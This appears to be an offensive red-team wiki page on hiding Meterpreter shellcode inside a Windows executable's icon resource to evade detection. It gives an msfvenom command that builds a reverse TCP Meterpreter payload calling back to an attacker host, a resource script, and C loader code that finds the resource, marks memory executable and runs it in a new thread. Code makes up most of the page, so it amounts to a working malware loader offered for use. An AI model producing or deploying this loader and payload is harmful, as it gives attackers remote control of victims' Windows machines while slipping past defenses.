# Resource Icon

Determines the location of a resource with the specified type and name in the specified module. Generate the shellcode and save it as a icon file `.ico`.

```
$ msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=<IP> lport=<IP> exitfunc=thread -f raw -o notepad.ico
```

Create a `resource.rc` file.

> [!INFO]
> You can include [[06 - Tactics & Techniques & Procedures Phases/F - Post Exploitation/0x01 - Defense Evasion/08 - Obfuscate Artifacts/Compile With Icon/Windows|another icon]] `IDI_ICON_1`. This is just to insert in the PE section.

```c
#define SC_ICON 2583
SHELLCODE_RESOURCE RCDATA "notepad.ico"
```

| Function         | Description                                                                                                      |
| ---------------- | ---------------------------------------------------------------------------------------------------------------- |
| `FindResource`   | Searches the specified module for a resource with the specified type and name. Returns a handle to the resource. |
| `LoadResource`   | Retrieves a handle that can be used to obtain a pointer to the first byte of the specified resource in memory.   |
| `SizeofResource` | Retrieves the size, in bytes, of the specified resource.                                                         |

```c
#include <windows.h>

#define SC_ICON 2583
int main() {
    // Find shellcode data
    HRSRC handle_resource = FindResource(NULL, MAKEINTRESOURCE(SHELLCODE_RESOURCE), RT_RCDATA);

    // Load shellcode
    HGLOBAL handle_global = LoadResource(NULL, handle_resource);

    // Get pointer to shellcode
    LPVOID memory_pointer = LockResource(handle_global);

    // Length of shellcode
    DWORD length = SizeofResource(NULL, handle_resource);

    // Allocate the memory
    LPVOID execute_memory = VirtualAlloc(NULL, length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    RtlMoveMemory(execute_memory, memory_pointer, length);

    DWORD old_protection = 0;
    BOOL returned_virtual_protection = VirtualProtect(execute_memory, length, PAGE_EXECUTE_READ, &old_protection);

    if(returned_virtual_protection != NULL) {
        HANDLE thread_handle = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)execute_memory, NULL, NULL, NULL);

        WaitForSingleObject(thread_handle, INFINITE);
    }
}
```

Compile the payload with an embedded resource inside a shellcode.

![[06 - Tactics & Techniques & Procedures Phases/F - Post Exploitation/0x01 - Defense Evasion/08 - Obfuscate Artifacts/Compile With Icon/Windows#^7b8f2f]]

![[06 - Tactics & Techniques & Procedures Phases/F - Post Exploitation/0x01 - Defense Evasion/08 - Obfuscate Artifacts/Compile With Icon/Windows#^0156d0]]

![[06 - Tactics & Techniques & Procedures Phases/F - Post Exploitation/0x01 - Defense Evasion/08 - Obfuscate Artifacts/Compile With Icon/Windows#^8747ee]]

![[06 - Tactics & Techniques & Procedures Phases/F - Post Exploitation/0x01 - Defense Evasion/08 - Obfuscate Artifacts/Compile With Icon/Windows#^af4abd]]

---
## References

### Backlinks

- [[03 - Offensive Infrastructure/E - Setup Machine/0x01 - Essentials/Compilers/Windows/C|Compilers: C]]

### Source Repositories

- [WafflesExploit: Hide Payload in Images](https://github.com/WafflesExploits/hide-payload-in-images)

### Red Team Notes

- [Red Team Notes: Loading and Executing Shellcode From PE Resources](https://www.ired.team/offensive-security/code-injection-process-injection/loading-and-executing-shellcode-from-portable-executable-resources)

### MalAPI

- [MalAPI: FindResourceA](https://malapi.io/winapi/FindResourceA)

- [MalAPI: FindResourceExA](https://malapi.io/winapi/FindResourceExA)

- [MalAPI: SizeOfResource](https://malapi.io/winapi/SizeOfResource)

- [MalAPI: LockResource](https://malapi.io/winapi/LockResource)

### Tenouk

- [Tenouk: Processes and Threads - Synchronization - Part 1](https://www.tenouk.com/ModuleV.html)

### Black-Hat-Zig

- [Black-Hat-Zig: `.rsrc `Section](https://black-hat-zig.cx330.tw/Basic-Payload-Management/Payload-Placement/dot_rsrc/)

### WafflesExploit

- [WafflesExploits: Concealing Payloads - Hiding Shellcode in Image Files with Python and C/C++](https://wafflesexploits.github.io/posts/Hide_a_Payload_in_Plain_Sight_Embedding_Shellcode_in_a_Image_file/)